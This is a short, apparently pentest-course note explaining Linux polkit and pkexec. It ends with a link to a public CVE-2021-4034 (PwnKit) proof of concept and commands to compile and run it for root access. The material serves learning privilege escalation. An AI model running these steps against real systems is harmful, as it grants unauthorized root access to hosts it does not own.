PolicyKit (`polkit`) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. To check whether the user software is authorized for this instruction, `polkit` is asked. It is possible to set how permissions are granted by default for each user and application.

PolKit also comes with three additional programs:

- `pkexec` - runs a program with the rights of another user or with root rights
- `pkaction` - can be used to display actions
- `pkcheck` - this can be used to check if a process is authorized for a specific action

The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.

```shell
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

Download [exploit](https://github.com/arthepsy/CVE-2021-4034)
```bash
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc

./poc
```